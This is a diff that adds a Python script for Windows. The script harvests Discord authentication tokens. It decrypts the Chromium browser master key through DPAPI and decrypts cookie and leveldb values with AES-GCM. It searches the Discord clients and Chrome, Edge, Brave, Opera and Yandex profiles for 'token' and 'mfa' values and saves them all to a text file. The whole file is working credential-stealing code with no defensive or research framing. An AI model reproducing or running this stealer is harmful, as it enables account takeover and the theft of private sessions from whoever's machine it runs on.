@@ -1,0 +1,145 @@
+import os
+import json
+import base64
+import sqlite3
+import shutil
+import tempfile
+from Crypto.Cipher import AES
+import win32crypt
+import re
+
+def get_master_key(path):
+    """Extract and decrypt the browser's master encryption key."""
+    try:
+        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception:
+        return None
+
+def decrypt_token(encrypted_value, master_key):
+    """Decrypt a Chrome/Edge encrypted value (AES-GCM)."""
+    try:
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted = cipher.decrypt(payload)[:-16].decode()
+        return decrypted
+    except Exception:
+        return None
+
+def extract_from_discord_app(path):
+    """Search the Discord app's leveldb for tokens."""
+    tokens = set()
+    leveldb = os.path.join(path, "Local Storage", "leveldb")
+    if not os.path.exists(leveldb):
+        return tokens
+
+    # Try to get the master key (for encrypted tokens)
+    master_key = None
+    local_state = os.path.join(path, "Local State")
+    if os.path.exists(local_state):
+        master_key = get_master_key(path)
+
+    for file in os.listdir(leveldb):
+        if not file.endswith((".log", ".ldb")):
+            continue
+        try:
+            with open(os.path.join(leveldb, file), "r", errors="ignore") as f:
+                content = f.read()
+                # Look for encrypted tokens
+                if master_key:
+                    for match in re.finditer(r"dQw4w9WgXcQ:([^\"]+)", content):
+                        try:
+                            enc = base64.b64decode(match.group(1))
+                            dec = decrypt_token(enc, master_key)
+                            if dec:
+                                tokens.add(dec)
+                        except:
+                            pass
+                # Also raw token regex
+                raw = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
+                tokens.update(raw)
+        except:
+            pass
+    return tokens
+
+def extract_from_browser(path, browser_name):
+    """Extract Discord token from Chromium cookies."""
+    tokens = set()
+    master_key = get_master_key(path)
+    if not master_key:
+        return tokens
+
+    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
+    for profile in profiles:
+        for cookie_db in [os.path.join(path, profile, "Network", "Cookies"),
+                          os.path.join(path, profile, "Cookies")]:
+            if not os.path.exists(cookie_db):
+                continue
+            temp_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}_{profile}.db")
+            try:
+                shutil.copy2(cookie_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%'")
+                for row in cursor.fetchall():
+                    name, enc_val = row
+                    if name in ("token", "mfa"):
+                        dec = decrypt_token(enc_val, master_key)
+                        if dec:
+                            tokens.add(dec)
+                cursor.close()
+                conn.close()
+                os.remove(temp_db)
+            except:
+                pass
+    return tokens
+
+def main():
+    all_tokens = set()
+    appdata = os.getenv("APPDATA")
+    localappdata = os.getenv("LOCALAPPDATA")
+
+    discord_clients = [
+        os.path.join(appdata, "Discord"),
+        os.path.join(appdata, "discordptb"),
+        os.path.join(appdata, "discordcanary"),
+        os.path.join(appdata, "DiscordDevelopment"),
+        os.path.join(appdata, "Lightcord"),
+        os.path.join(appdata, "Nightcord"),       # if they have it
+        os.path.join(appdata, "Opera GX Stable"), # sometimes they store Discord there?
+    ]
+    for client in discord_clients:
+        if os.path.exists(client):
+            tokens = extract_from_discord_app(client)
+            if tokens:
+                all_tokens.update(tokens)
+
+    browsers = {
+        "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
+        "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
+        "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
+        "Yandex": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data"),
+    }
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            tokens = extract_from_browser(path, name)
+            if tokens:
+                all_tokens.update(tokens)
+
+    if all_tokens:
+        out_file = os.path.join(os.getcwd(), "discord_tokens.txt")
+        with open(out_file, "w") as f:
+            for token in sorted(all_tokens):
+                f.write(token + "\n")
+        print(f"[+] Found {len(all_tokens)} token(s). Saved to {out_file}")
+    else:
+        print("[-] No tokens found.")
+
+if __name__ == "__main__":
+    main()
